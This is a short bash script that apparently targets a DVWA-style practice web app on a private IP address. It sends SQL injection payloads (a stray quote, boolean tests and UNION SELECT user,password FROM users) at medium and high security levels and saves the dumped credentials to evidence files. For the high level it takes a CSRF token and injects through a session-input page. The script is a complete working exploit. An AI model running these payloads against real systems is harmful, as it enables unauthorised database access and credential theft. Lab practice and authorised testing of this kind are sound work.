CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=medium'
BASE='http://10.31.0.87:3000'
post(){ curl -s -b "$CK" "$BASE/vulnerabilities/sqli/" --data-urlencode "id=$1" --data-urlencode "Submit=Submit" | grep -oE '<pre>.*</pre>' | sed 's/<[^>]*>//g' | head -c 2000; echo " <<== [$1]"; }
mkdir -p evidence/sqli
post "1'"
post "1 AND 1=1"
post "1 AND 1=2"
post "1 UNION SELECT user,password FROM users" | tee evidence/sqli/users-dump-medium.txt
# high uses session-based id; test via curl session emulation
CKH='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
TOK=$(curl -s -b "$CKH" "$BASE/vulnerabilities/sqli/" | grep -oE "user_token' value='[0-9a-f]{32}" | grep -oE "[0-9a-f]{32}")
echo "high token: $TOK"
# high: id sent via POST to session-input.php stores in session; then sqli reads it
curl -s -b "$CKH" "$BASE/vulnerabilities/sqli/session-input.php" --data-urlencode "id=1' UNION SELECT user,password FROM users -- x" --data-urlencode "Submit=Submit" -o /dev/null
curl -s -b "$CKH" "$BASE/vulnerabilities/sqli/" | grep -oE '<pre>.*</pre>' | sed 's/<[^>]*>//g' | head -c 2000 | tee evidence/sqli/users-dump-high.txt
